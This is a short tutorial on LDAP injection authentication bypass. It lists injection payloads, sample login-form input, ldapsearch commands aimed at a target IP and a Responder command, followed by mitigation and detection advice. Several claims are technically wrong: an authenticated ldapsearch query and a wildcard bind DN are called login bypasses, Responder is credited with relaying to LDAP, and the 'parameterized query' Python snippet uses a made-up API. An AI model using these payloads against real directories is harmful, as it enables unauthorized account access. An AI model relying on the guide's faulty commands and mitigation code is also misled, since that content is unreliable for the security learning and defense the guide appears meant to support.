# **LDAP Authentication Bypass Attack**

## **Understanding LDAP Authentication Bypass**

- **LDAP Authentication Bypass** is a critical vulnerability that allows attackers to bypass authentication mechanisms by manipulating LDAP queries.
- The core of this attack lies in injecting values that modify the intended logic of LDAP filters.
- This often occurs when user input is directly concatenated into LDAP queries without proper sanitization.

---

## **How LDAP Authentication Bypass Works**

1. **LDAP Query Basics:**

   - A typical LDAP authentication filter:
     ```
     (&(uid={user_input})(password={pass_input}))
     ```
   - If `{user_input}` or `{pass_input}` can be manipulated, the logic of the filter can be altered.

2. **Bypass Example (Injection of Always True Statements):**

   - **User Input:**
     ```
     *)(uid=*)
     ```
   - **Resulting Query:**
     ```
     (&(uid=*)(uid=*)(password={pass_input}))
     ```
   - The query returns **true** for any user, bypassing password verification.

3. **Impact:**
   - **Complete Authentication Bypass** – The attacker logs in as any user without valid credentials.
   - **Privilege Escalation** – Gain unauthorized access to admin or privileged accounts.

---

## **Tools and Techniques**

### **Burp Suite (Web LDAP Injection):**

- Burp Suite can intercept and manipulate LDAP authentication forms.
- **Steps:**
  1.  Intercept login requests.
  2.  Inject payloads into username and password fields.
  3.  Observe server responses to identify bypass conditions.

---

### **ldapsearch (Command Line Tool):**

- **ldapsearch** can test LDAP queries against live directories.
- **Example Command:**
  ```bash
  ldapsearch -x -h <target_ip> -D "cn=admin,dc=example,dc=com" -W "(&(uid=*)(objectClass=user))"
  ```
  - This bypasses login by searching for any `uid`.

---

### **Responder (NTLM to LDAP Exploit):**

- Responder can manipulate NTLM-SSP authentication to relay traffic to LDAP.
- **Command:**
  ```bash
  sudo responder -I eth0
  ```

---

## **Example LDAP Authentication Bypass Payloads**

- **Common Injection Strings:**
  ```
  *
  *)(uid=*)
  *)(objectClass=*)
  admin*)(uid=*)
  ```
- **Injection in Login Form:**
  ```
  Username: *)(uid=*)
  Password: anything
  ```
- **Outcome:**
  - Bypass authentication and return results for all users.

---

## **Mitigation Techniques**

- **Parameterized LDAP Queries:**
  - Use LDAP libraries that support **parameterized queries** to prevent injection.
  ```python
  ldap_query = "(&(uid=%s)(password=%s))"
  ldap.execute(ldap_query, [user_input, pass_input])
  ```
- **Strict Input Validation:**

  - Disallow special characters like `*`, `)` in username and password fields.
  - Use **input sanitization** and whitelisting.

- **Minimal Privileges:**

  - Restrict LDAP query privileges to only necessary attributes.

- **Role-Based Access Control (RBAC):**

  - Limit access to sensitive directories and attributes based on user roles.

- **Error Handling:**

  - Do not expose detailed LDAP errors. Use generic error messages to avoid information leakage.

- **Access Control Lists (ACLs):**
  - Configure ACLs to restrict access to the LDAP directory.

---

## **Testing and Detection**

- **Burp Suite/ZAP:**
  - Automate LDAP injection scans on login forms.
- **Wireshark:**
  - Monitor LDAP traffic for suspicious wildcard patterns.
- **Splunk (SIEM):**
  - Set up LDAP query anomaly detection and log analysis.

---

## **Example LDAP Bypass Test (ldapsearch):**

- **Bypass Login with Wildcard:**
  ```bash
  ldapsearch -x -LLL -h <target_ip> -D "cn=*,dc=example,dc=com" -W "(&(uid=*)(objectClass=user))"
  ```

---

## **⚠️Disclaimer⚠️**

This guide is for **educational purposes only**. Unauthorized LDAP manipulation is illegal and unethical. Always conduct penetration testing with proper authorization and adhere to legal boundaries.
